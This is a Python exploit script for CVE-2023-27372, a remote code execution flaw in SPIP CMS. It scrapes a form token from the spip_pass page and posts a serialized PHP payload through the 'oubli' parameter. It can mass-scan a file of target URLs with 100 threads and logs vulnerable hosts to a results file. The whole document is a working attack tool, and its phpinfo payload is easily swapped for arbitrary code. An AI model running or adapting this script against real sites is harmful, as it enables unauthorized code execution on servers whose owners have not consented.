import urllib,time
from multiprocessing.dummy import Pool

import requests, argparse,re

requests.packages.urllib3.disable_warnings()


def banner():
    test = """
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗       ██████╗ ███████╗██████╗ ███████╗██████╗ 
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗      ╚════██╗╚════██║╚════██╗╚════██║╚════██╗
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗ █████╔╝    ██╔╝ █████╔╝    ██╔╝ █████╔╝
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝██╔═══╝    ██╔╝  ╚═══██╗   ██╔╝ ██╔═══╝ 
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝      ███████╗   ██║  ██████╔╝   ██║  ███████╗
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝       ╚══════╝   ╚═╝  ╚═════╝    ╚═╝  ╚══════╝ 
                                                                                                        author:秋妤
                                                                                                        data:2024.09.13
                                                                                                        version:1.0                                                                                                                                                                        
    """
    print(test)


def poc(target):
    payload = '/spip.php?page=spip_pass'
    url=target+payload
    headers = {
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/128.0.0.0Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip,deflate,br",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "191"
    }
    proxies = {
        "http": "http://127.0.0.1:7890",
        "https": "http://127.0.0.1:7890",
    }
    try:
        res1 = requests.get(url, headers=headers, proxies=proxies,timeout=5)
        match = re.search(r'<input[^>]*name=[\'"]formulaire_action_args[\'"][^>]*value=[\'"]([^\'"]+)[\'"]', res1.text)
        if match:
            value = match.group(1)
            print("formulaire_action_args的值:", value)
            decoded_string = urllib.parse.unquote(value)
            formulaire_action_args_value = urllib.parse.quote(decoded_string, safe='')

        data = f'page=spip_pass&formulaire_action=oubli&formulaire_action_args={formulaire_action_args_value}&oubli=s:19:"<?php phpinfo(); ?>";&nobot='
        print(data)
        res2 = requests.post(url, headers=headers,data=data,timeout=10)
        if 'version' in res2.text:
            print(f'[+]{target}存在漏洞')
            with open('SPIP_result.txt','a',encoding='utf-8') as f:
                f.write(f'{target}\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except Exception as e:
        print(e)

def main():
    banner()
    parser = argparse.ArgumentParser(description='CVE-2023-27372 SPIP CMS远程代码执行漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str,help='please enter url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='please enter file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    if args.file and not args.url:
        url_list=[]
        with open(args.file, 'r') as f:
            for url in f:
                url_list.append(url.strip().replace('\n',''))
                mp = Pool(100)
                mp.map(poc, url_list)
                mp.close()
                mp.join()


if __name__ == '__main__':
    main()